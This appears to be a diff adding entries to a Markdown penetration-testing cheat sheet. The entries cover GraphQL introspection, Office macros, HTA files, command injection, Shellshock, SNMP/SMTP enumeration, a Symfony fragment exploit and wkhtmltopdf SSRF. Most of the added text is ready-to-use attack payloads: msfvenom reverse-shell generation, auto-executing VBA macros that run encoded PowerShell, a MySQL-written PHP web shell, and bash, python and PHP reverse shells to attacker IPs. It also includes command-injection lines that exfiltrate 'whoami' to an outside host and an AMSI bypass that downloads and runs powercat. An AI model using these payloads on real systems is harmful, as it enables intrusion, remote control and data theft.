+  /api/graphql
+  /graphql/api
+  /graphql/graphql
+  /graphql
+  /api/v1
+  /api/graphql/v1
+  /graphql/api/v1
+  /graphql/graphql/v1
+  ```
+- **GraphQL universal query**:
+  ```graphql
+  /api?query=query{__typename}
+  /api/graphql?query=query{__typename}
+  ```
+- **GraphQL Probing for introspection**:
+  ```graphql
+   {
+        "query": "{__schema{queryType{name}}}"
+    }
 
+  ```
+- **GraphQL Running a full introspection query 1**:
+  ```graphql
+  {__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}
+
+  ```
+
+- **GraphQL Running a full introspection query 2**:
+  ```graphql
+  {"query":"{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}"}
+
+  ```
+- **GraphQL Running a full introspection query (Removing the onOperation, onFragment, and onField directives from the query structure)**:
+  ```graphql
+   query IntrospectionQuery {
+        __schema {
+            queryType {
+                name
+            }
+            mutationType {
+                name
+            }
+            subscriptionType {
+                name
+            }
+            types {
+             ...FullType
+            }
+            directives {
+                name
+                description
+                args {
+                    ...InputValue
+            }
+            onOperation  #Often needs to be deleted to run query
+            onFragment   #Often needs to be deleted to run query
+            onField      #Often needs to be deleted to run query
+            }
+        }
+    }
+
+    fragment FullType on __Type {
+        kind
+        name
+        description
+        fields(includeDeprecated: true) {
+            name
+            description
+            args {
+                ...InputValue
+            }
+            type {
+                ...TypeRef
+            }
+            isDeprecated
+            deprecationReason
+        }
+        inputFields {
+            ...InputValue
+        }
+        interfaces {
+            ...TypeRef
+        }
+        enumValues(includeDeprecated: true) {
+            name
+            description
+            isDeprecated
+            deprecationReason
+        }
+        possibleTypes {
+            ...TypeRef
+        }
+    }
+
+    fragment InputValue on __InputValue {
+        name
+        description
+        type {
+            ...TypeRef
+        }
+        defaultValue
+    }
+
+    fragment TypeRef on __Type {
+        kind
+        name
+        ofType {
+            kind
+            name
+            ofType {
+                kind
+                name
+                ofType {
+                    kind
+                    name
+                }
+            }
+        }
+    }
+
+  ```
 ### Hashing Attacks
 - **Hashing Example**:
   ```python
@@ -4099,6 +4827,49 @@ curl http://example.com/image?filename=../../../../../etc/passwd%00.png
   ```html
   <script src="mshta.exe" />
   ```
+- **Generating HTA Reverse shell**:
+  ```html
+  sudo msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=4444 -f hta-psh -o /var/www/html/evil.hta
+
+  ```
+- **HTA file to execute cmd.exe**:
+  ```html
+  <html>
+  <body>
+  
+  <script>
+  
+    var c= 'cmd.exe'
+    new ActiveXObject('WScript.Shell').Run(c);
+    
+  </script>
+  
+  </body>
+  </html>
+  
+  # Updated proof of concept
+  <html>
+  <head>
+  
+  <script>
+  
+    var c= 'cmd.exe'
+    new ActiveXObject('WScript.Shell').Run(c);
+    
+  </script>
+  
+  </head>
+  <body>
+  
+  <script>
+    
+    self.close();
+      
+  </script>
+    
+  </body>
+  </html>
+  ```
 
 ### HTTP Header Attacks
 - **HTTP Header Injection Example**:
@@ -4116,6 +4887,24 @@ curl http://example.com/image?filename=../../../../../etc/passwd%00.png
 - **IRC Example**:
   ```bash
   irc://example.com/channel
+  ```
+- **Connection with random nickname**:
+  ```bash
+  user kali 0 * kali
+  nick kali
+  ```
+- **list channels/Users**:
+  ```bash
+  list
+  ```
+- **join channel**:
+  ```bash
+  join #channelname
+  ```
+- **posting a message into the channel/user**:
+  ```bash
+  privmsg #channel-name hello
+  privmsg user hello
   ```
 
 ### JSON Web Token (JWT)
@@ -4186,22 +4975,105 @@ curl http://192.168.1.33/dashboard.php?show=pending/../../../../../etc/passwd
 ### Macros
 - **Macro Example**:
   ```vba
+  Sub MyMacro()
+  
+    CreateObject("Wscript.Shell").Run "cmd"
+    
+  End Sub
+
+  ```
+- **Macro that execute cmd.exe**:
+  ```vba
   Sub AutoOpen()
       Set objShell = CreateObject("WScript.Shell")
       objShell.Run "cmd.exe /c calc.exe"
   End Sub
   ```
+- **Macro that automatically execute cmd**:
+  ```vba
+   Sub AutoOpen()
+  
+    MyMacro
+    
+  End Sub
+  
+  Sub Document_Open()
+  
+    MyMacro
+    
+  End Sub
+  
+  Sub MyMacro()
+  
+    CreateObject("Wscript.Shell").Run "cmd"
+    
+  End Sub
+  ```
+- **Macro: invoking PowerShell to create a reverse shell**:
+  ```vba
+  Sub AutoOpen()
+    MyMacro
+  End Sub
+  
+  Sub Document_Open()
+      MyMacro
+  End Sub
+  
+  Sub MyMacro()
+      Dim Str As String
+      
+    Str = "powershell.exe -nop -w hidden -e JABzACAAPQAgAE4AZ"
+    Str = Str + "QB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBNAGUAbQBvAHIAeQB"
+    Str = Str + "TAHQAcgBlAGEAbQAoACwAWwBDAG8AbgB2AGUAcgB0AF0AOgA6A"
+    Str = Str + "EYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAnAEg"
+    Str = Str + "ANABzAEkAQQBBAEEAQQBBAEEAQQBFAEEATAAxAFgANgAyACsAY"
+    Str = Str + "gBTAEIARAAvAG4ARQBqADUASAAvAGgAZwBDAFoAQwBJAFoAUgB"
+    ...
+    Str = Str + "AZQBzAHMAaQBvAG4ATQBvAGQAZQBdADoAOgBEAGUAYwBvAG0Ac"
+    Str = Str + "AByAGUAcwBzACkADQAKACQAcwB0AHIAZQBhAG0AIAA9ACAATgB"
+    Str = Str + "lAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAFMAdAByAGUAYQBtA"
+    Str = Str + "FIAZQBhAGQAZQByACgAJABnAHoAaQBwACkADQAKAGkAZQB4ACA"
+    Str = Str + "AJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAVABvAEUAbgBkACgAK"
+    Str = Str + "QA="
 
+    CreateObject("Wscript.Shell").Run Str
+    End Sub
+
+  ```
+- **Creating HTA payload with msfvenom**:
+  ```bash
+  sudo msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=4444 -f hta-psh -o /var/www/html/evil.hta
+  ```
+- **Python script to split Base64 encoded string**:
+  ```bash
+  str = "powershell.exe -nop -w hidden -e JABzACAAPQAgAE4AZQB3AC....."
+
+  n = 50
+  
+  for i in range(0, len(str), n):
+  	print "Str = Str + " + '"' + str[i:i+n] + '"'
+  ```
+- **NFS Example**:
+  ```bash
+  mount -t nfs target:/path /mnt
+  ```
+  
 ### Network File System (NFS)
 - **NFS Example**:
   ```bash
   mount -t nfs target:/path /mnt
   ```
 
-### Operating System (OS) Vulnerabilities
-- **OS Vulnerability Example**:
+### OS command injection
+- **OS injection basic payloads**:
   ```bash
-  sudo apt-get install vulnerable-package
+  storid=1 ; whomai
+  storid= 1 | whoami
+  email=x||ping+-c+10+127.0.0.1||
+  email=||whoami>/var/www/images/output.txt||			//Blind OS command injection with output redirection
+  email=x||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN||
+  email=x||curl+http://ehz2g0r2zgoirolnmagql5jaj1psdk19.oastify.com/?id=$(whoami) ||
+  email=||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN||
   ```
 
 ### Other Vulnerabilities
@@ -4214,6 +5086,10 @@ curl http://192.168.1.33/dashboard.php?show=pending/../../../../../etc/passwd
 - **phpMyAdmin Example**:
   ```php
   http://example.com/phpmyadmin
+  ```
+- **Abusing the into outfile function in MySQL to write a php code to the target's webroot at http://127.0.0.1:8080/phpmyadmin/server_sql.php.**:
+  ```php
+  SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE 'C:/wamp/www/shell.php';
   ```
 
 ### Privilege Escalation Linux (LIN)
@@ -4300,6 +5176,12 @@ curl http://192.168.68.53:8080/site/index.php?page=http://192.168.49.68/pwn.php
   ```bash
   env x='() { :;}; echo vulnerable' bash -c "echo hello"
   ```
+- **Shellshock basic payload**:
+  ```bash
+  GET /cgi-bin/admin.cgi HTTP/1.1
+  Host: 10.11.1.71
+  User-Agent: () { :;}; /bin/bash -i >& /dev/tcp/192.168.119.139/443 0>&1
+  ```
 
 ### Server Message Block (SMB)
 - **SMB Example**:
@@ -4312,11 +5194,109 @@ curl http://192.168.68.53:8080/site/index.php?page=http://192.168.49.68/pwn.php
   ```bash
   telnet smtp.target.com 25
   ```
+- **Using nc to validate SMTP users**:
+  ```bash
+  nc -nv 10.11.1.217 25
+  VRFY root
+  VRFY idontexist
+  ^C
+  ```
+- **Testing Anonymous SMTP Connections**:
+  ```bash
+  #command: nc -C 192.168.168.55 25
+  220 mailserver.domain.com Microsoft ESMTP MAIL Service, Version: 5.0.2195.5329 ready at  Sat, 22 May 2012 09:01:29 +0200
+  helo myserver.domain.com
+  250 mailserver.domain.com Hello [10.12.150.2]
+  mail from:<myname@mydomain.com>
+  250 2.1.0 myname@mydomain.com....Sender OK
+  rcpt to:<recipientname@mydomain.com>
+  250 2.1.5 recipientname@mydomain.com
+  data
+  354 Start mail input; end with <CRLF>.<CRLF>
+  subject: This is a test mail
+  to: recipientname@mydomain.com
+  This is the text of my test mail.
+  .
+  250 2.6.0 <exchange.domain.com> Queued mail for delivery
+  quit
+  
+  #Other Example
+  250 2.6.0 <VICTIMFRaqbC8wSA1Xv00000002@VICTIM> Queued mail for delivery
+  HELO
+  MAIL FROM: asdf@asdf.com
+  250 2.1.0 asdf@asdf.com....Sender OK
+  RCPT TO:lhale@victim
+  250 2.1.5 lhale@victim 
+  DATA
+  354 Start mail input; end with <CRLF>.<CRLF>
+  Subject: job application
+  urgent
+  
+  http://192.168.119.168/test
+  .
+  250 2.6.0 <VICTIMPbDfzlu76c5KK00000003@VICTIM> Queued mail for delivery
+  ```
+- **SMTP User enumeration python script**:
+  ```bash
+  #!/usr/bin/python
+
+  import socket
+  import sys
+  
+  if len(sys.argv) != 2:
+          print "Usage: vrfy.py <username>"
+          sys.exit(0)
+  
+  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+  connect = s.connect(('10.11.1.217',25))
+  
+  banner = s.recv(1024)
+  print banner
+  
+  s.send('VRFY ' + sys.argv[1] + '\r\n')
+  result = s.recv(1024)
+  print result
+  s.close()
+  ```
+
 
 ### Simple Network Management Protocol (SNMP)
 - **SNMP Example**:
   ```bash
   snmpwalk -v 2c -c public 192.168.1.1
+  ```
+- **using snmp-check to scan for a running SNMP service on the target.**:
+  ```bash
+  snmp-check 192.168.208.42
+  ```
+- **Using nmap to perform a SNMP scan**:
+  ```bash
+  sudo nmap -sU --open -p 161 10.11.1.1-254 -oG open-snmp.txt
+  ```
+- **Using onesixtyone to brute force community strings**:
+  ```bash
+  echo public > community
+  echo private >> community
+  echo manager >> community
+  for ip in $(seq 1 254); do echo 10.11.1.$ip; done > ips
+  onesixtyone -c community -i ips
+  ```
+- **Using snmpwalk to enumerate the entire MIB tree, enumerate Windows users, processes, installed softwares and TCP open ports**:
+  ```bash
+  snmpwalk -c public -v1 10.11.1.14 1.3.6.1.4.1.77.1.2.25
+  snmpwalk -c public -v1 10.11.1.73 1.3.6.1.2.1.25.4.2.1.2
+  snmpwalk -c public -v1 10.11.1.14 1.3.6.1.2.1.6.13.1.3
+  snmpwalk -c public -v1 10.11.1.50 1.3.6.1.2.1.25.6.3.1.2 
+  ```
+- **Some Windows SNMP MIB values**:
+  ```bash
+  1.3.6.1.2.1.25.1.6.0	System Processes
+  1.3.6.1.2.1.25.4.2.1.2	Running Programs
+  1.3.6.1.2.1.25.4.2.1.4	Processes Path
+  1.3.6.1.2.1.25.2.3.1.4	Storage Units
+  1.3.6.1.2.1.25.6.3.1.2	Software Name
+  1.3.6.1.4.1.77.1.2.25	User Accounts
+  1.3.6.1.2.1.6.13.1.3	TCP Local Ports
   ```
 
 ### Server-Side Request Forgery (SSRF)
@@ -4336,11 +5316,40 @@ curl http://192.168.68.53:8080/site/index.php?page=http://192.168.49.68/pwn.php
   ```bash
   php bin/console server:start
   ```
+- **Symfony: some usefull links and tricks**:
+  ```bash
+  #Getting the secret
+  #https://www.synacktiv.com/en/publications/looting-symfony-with-eos.html
+  
+  http://192.168.56.2/app_dev.php/_profiler/open?file=app/config/parameters.yml
+  
+  #_fragment exploitation
+  #https://www.ambionics.io/blog/symfony-secret-fragment
+  #https://github.com/ambionics/symfony-exploits
+  
+  git clone https://github.com/ambionics/symfony-exploits  
+  python3 secret_fragment_exploit.py -s 48a8538e6260789558f0dfe29861c05b http://192.168.120.194
+  
+  python3 secret_fragment_exploit.py 'http://192.168.56.2/_fragment' --method 1 --secret '48a8538e6260789558f0dfe29861c05b' --algo 'sha256' --internal-url 'http://192.168.56.2/_fragment' --function system --parameters command:"bash -c 'bash -i >& /dev/tcp/192.168.56.1/80 0>&1'"  return_value:null
+  
+  http://192.168.56.2/_fragment?_path=command%3Dbash%2B-c%2B%2527bash%2B-i%2B%253E%2526%2B%252Fdev%252Ftcp%252F192.168.56.1%252F80%2B0%253E%25261%2527%26return_value%3Dnull%26_controller%3Dsystem&_hash=ZbBPtkD0bYhNLAGb6Nk%2BCBrJppgMGHje9%2BQ0rbQZ4ng%3D
+  ```
 
 ### Trivial File Transfer Protocol (TFTP)
-- **TFTP Example**:
+- **Basic Enumeration**:
   ```bash
-  tftp target.com
+  #nmap scan
+  nmap -n -Pn -sU -p69 -sV --script tftp-enum <IP>
+  
+  #msfconsole - Download-Upload
+  msf5> auxiliary/admin/tftp/tftp_transfer_util
+  ```
+- **Basic Downloading/Uploading python**:
+  ```bash
+  import tftpy
+  client = tftpy.TftpClient(<ip>, <port>)
+  client.download("filename in server", "/tmp/filename", timeout=5)
+  client.upload("filename to upload", "/local/path/file", timeout=5)
   ```
 
 ### Web Cache Poisoning
@@ -4359,6 +5368,24 @@ curl http://192.168.68.53:8080/site/index.php?page=http://192.168.49.68/pwn.php
 - **wkhtmltopdf Example**:
   ```bash
   wkhtmltopdf http://example.com output.pdf
+  ```
+- **Exploit SSRF & LFI in wkhtmltopdf**:
+  ```bash
+  #Creating HTML File e.g. index.html:
+  <iframe src="http://0.tcp.eu.ngrok.io:13264/index.php?x=/etc/passwd" width=1000px height=1000px></iframe>
+  
+  # Creating PHP File e.g. index.php:
+  <?php header('location:file://'.$_REQUEST['x']); ?>
+  
+  #PHP Web Server:
+  php -S 127.0.0.1:8000
+
+  # Build tunnel
+  ngrok tcp 127.0.0.1:8000
+  ###Exploit SSRF via the following payload:
+  http://ngrok-link:port/index.html
+  e.g. http://0.tcp.eu.ngrok.io:13264/index.html
+  
   ```
 
 ### WordPress (WP)
@@ -4461,6 +5488,47 @@ curl http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=c
 - **Python Reverse Shell**:
   ```bash
   python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("<attacker-IP>",<port>)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(["/bin/sh","-i"])'
+  python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.184",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
+  python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22192.168.49.59%22,443));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/bash%22,%22-i%22]);%27
+
+  ```
+- **Bash Reverse Shell**:
+  ```bash
+  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.0.4 1234 >/tmp/f 
+  echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.0.4 1234 >/tmp/f" >> user_backups.sh
+  "bash -c 'bash -i >& /dev/tcp/192.168.49.121/443 0>&1'"
+  bash -c 'bash -i >& /dev/tcp/192.168.49.121/443 0>&1'
+  rm /tmp/f;mkfifo /tmp/f ;cat /tmp/f|/bin/sh -i 2>&1 |nc 192.168.118.4 8080  >/tmp/f --> URL Encode
+  ```
+- **PHP Reverse Shell**:
+  ```bash
+  <?php system($_GET['cmd']);?>
+  <?php echo file_get_contents('/home/carlos/secret'); ?>                                                         
+  <?php system("bash -i >& /dev/tcp/10.11.0.99/443 0>&1"); ?>
+  <?php shell_exec("bash -i >& /dev/tcp/192.168.119.172/443 0>&1"); ?>
+  <?php $sock = fsockopen("10.11.0.99",5566); $proc = proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes); ?>
+
+  ```
+- **Creating simple reverse shell with cat**:
+  ```bash
+  cat > script.sh <<EOF
+  cat > script.sh <<EOF
+  > rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.1.4 4445 >/tmp/f
+  <tmp/f|/bin/sh -i 2>&1|nc 192.168.118.5 4445 >/tmp/f
+  > EOF
+  EOF
+  ```
+- **Powershell Reverse Shell with bypassing amsi**:
+  ```bash
+  [Ref].Assembly.GetType('System.Management.Automation.'+$("41 6D 73 69 55 74 69 6C 73".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result=$result+$_};$result)).GetField($("61 6D 73 69 49 6E 69 74 46 61 69 6C 65 64".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result2=$result2+$_};$result2),'NonPublic,Static').SetValue($null,$true); iex (New-Object System.Net.WebClient).DownloadString('http://192.168.45.221/powercat.ps1'); powercat -c 192.168.45.221 -p 443 -e cmd.exe
+  #decoded: -->
+  $text='[Ref].Assembly.GetType("System.Management.Automation."+$("41 6D 73 69 55 74 69 6C 73".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result=$result+$_};$result)).GetField($("61 6D 73 69 49 6E 69 74 46 61 69 6C 65 64".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result2=$result2+$_};$result2),"NonPublic,Static").SetValue($null,$true);iex (New-Object System.Net.WebClient).DownloadString("http://172.16.221.77/powercat.ps1"); powercat -c 172.16.221.77 -p 4444 -e cmd.exe'
+  $Bytes=[System.Text.Encoding]::Unicode.GetBytes($text)
+  $EncodedText =[Convert]::ToBase64String($Bytes)
+  $EncodedText
+  Executing the shell: -->
+  SCShell> C:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -enc WwBSAGUAZgBdAC4AQQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQAVAB5AHAAZQAoACIAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuACIAKwAkACgAIgA0ADEAIAA2AEQAIAA3ADMAIAA2ADkAIAA1ADUAIAA3ADQAIAA2ADkAIAA2AEMAIAA3ADMAIgAuAFMAcABsAGkAdAAoACIAIAAiACkAfABmAG8AcgBFAGEAYwBoAHsAWwBjAGgAYQByAF0AKABbAGMAbwBuAHYAZQByAHQAXQA6ADoAdABvAGkAbgB0ADEANgAoACQAXwAsADEANgApACkAfQB8AGYAbwByAEUAYQBjAGgAewAkAHIAZQBzAHUAbAB0AD0AJAByAGUAcwB1AGwAdAArACQAXwB9ADsAJAByAGUAcwB1AGwAdAApACkALgBHAGUAdABGAGkAZQBsAGQAKAAkACgAIgA2ADEAIAA2AEQAIAA3ADMAIAA2ADkAIAA0ADkAIAA2AEUAIAA2ADkAIAA3ADQAIAA0ADYAIAA2ADEAIAA2ADkAIAA2AEMAIAA2ADUAIAA2ADQAIgAuAFMAcABsAGkAdAAoACIAIAAiACkAfABmAG8AcgBFAGEAYwBoAHsAWwBjAGgAYQByAF0AKABbAGMAbwBuAHYAZQByAHQAXQA6ADoAdABvAGkAbgB0ADEANgAoACQAXwAsADEANgApACkAfQB8AGYAbwByAEUAYQBjAGgAewAkAHIAZQBzAHUAbAB0ADIAPQAkAHIAZQBzAHUAbAB0ADIAKwAkAF8AfQA7ACQAcgBlAHMAdQBsAHQAMgApACwAIgBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACIAKQAuAFMAZQB0AFYAYQBsAHUAZQAoACQAbgB1AGwAbAAsACQAdAByAHUAZQApADsAaQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADcAMgAuADEANgAuADIAMgAxAC4ANwA3AC8AcABvAHcAZQByAGMAYQB0AC4AcABzADEAIgApADsAIABwAG8AdwBlAHIAYwBhAHQAIAAtAGMAIAAxADcAMgAuADEANgAuADIAMgAxAC4ANwA3ACAALQBwACAANAA0ADQANAAgAC0AZQAgAGMAbQBkAC4AZQB4AGUA
+
   ```
 
 ### Bind Shells
